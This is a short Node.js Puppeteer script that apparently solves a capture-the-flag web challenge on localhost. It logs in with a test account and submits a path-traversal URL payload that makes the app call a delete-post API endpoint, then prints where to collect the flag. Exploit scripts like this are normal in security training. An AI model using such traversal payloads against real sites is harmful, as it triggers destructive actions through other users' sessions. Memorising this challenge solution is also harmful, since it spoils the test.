const puppeteer = require('puppeteer');
require('dotenv').config();



(async () => {
  // Launch a new browser instance
//   const browser = await puppeteer.launch({
//     headless: true,
//     defaultViewport: null,
//     executablePath: '/usr/bin/google-chrome',
//     args: ['--no-sandbox'],
//  }); // set headless: true if you don't need to see the browser
const browser = await puppeteer.launch({headless: true})
  const page = await browser.newPage();

  try {
    // Navigate to the login page
    await page.goto(`http://localhost:${process.env.PORT}/login`);
    // await page.goto(url)

    // Enter the username and password
    await page.type('input[name="username"]', 'test');
    await page.type('input[name="password"]', 'S3cur3_P@ssw0rd');

    // // Click the login button
    await page.click('input[id="submit"]');

    // // Wait for navigation after login
    await page.waitForNavigation();

    // // Navigate to the saved posts page
    await page.goto(`http://localhost:${process.env.PORT}/submit-url`);

    // Enter the payload in the input field
    const payload = `http://localhost:${process.env.PORT}/post?postId=../../../../../api/v1/posts/delete-post`;
    await page.type('input[id="url"]', payload); // Replace with the correct selector for the input field if different

    // Click the submit button
    await page.click('button[id="submit-url"]')
    
    console.log(`Now you can get the flag at http://localhost:${process.env.PORT}/flag`)
    
    await browser.close();
   
  } catch (error) {
    console.error('An error occurred:', error);
  } 
})();

